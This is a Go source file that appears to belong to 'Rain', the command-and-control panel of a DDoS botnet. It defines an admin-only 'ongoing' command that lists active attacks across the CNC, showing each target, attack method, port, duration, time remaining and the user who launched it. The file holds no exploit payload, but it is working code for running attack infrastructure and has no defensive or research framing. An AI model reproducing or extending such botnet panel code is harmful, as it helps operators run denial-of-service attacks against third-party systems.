package Commands

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"Rain/core/masters/sessions"
	ParseINI "Rain/core/functions/ini"
	
	"Rain/core/database"

	"github.com/alexeyco/simpletable"
)

func init() {
	Load_Commands(&Command_interface{
		Name:        "ongoing",
		Roles:       []string{"admin"},
		Admin:       true,
		Reseller:    false,
		Description: "Simple ongoing command",
		CommandExecution: func(session *Sessions.Session, cmd []string) error {

			Attacks, _ := Database.Ongoing(session.User.Username)

			if len(Attacks) == 0 {
				session.Channel.Write([]byte("There are currently 0 running attacks across the cnc\r\n"))
				return nil
			}

			session.Channel.Write([]byte("\x1b[38;5;239m"))

			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m#\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mTarget\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mMethod\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mPort\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mLength\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mFinish\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mUser\x1b[38;5;239m"},
				},
			}

			Attacks, _ = Database.Ongoing(session.User.Username)

			for C, s := range Attacks {
				lol, _ := strconv.ParseInt(strconv.Itoa(int(s.End)), 10, 64)
				TimeToWait := time.Unix(lol, 0)
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + strconv.Itoa(C) + "\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + s.Target + "\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + s.Method + "\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + strconv.Itoa(s.Port) + "\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + strconv.Itoa(s.Duration) + "\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + fmt.Sprintf("%.0f secs", time.Until(TimeToWait).Seconds()) + "\x1b[38;5;239m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m" + s.Username + "\x1b[38;5;239m"},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			ParseINI.ParseTableGlobalRunning(table)

			fmt.Fprint(session.Channel, "")
			fmt.Fprintln(session.Channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
			fmt.Fprint(session.Channel, "\r")

			return nil
		},
	})
}
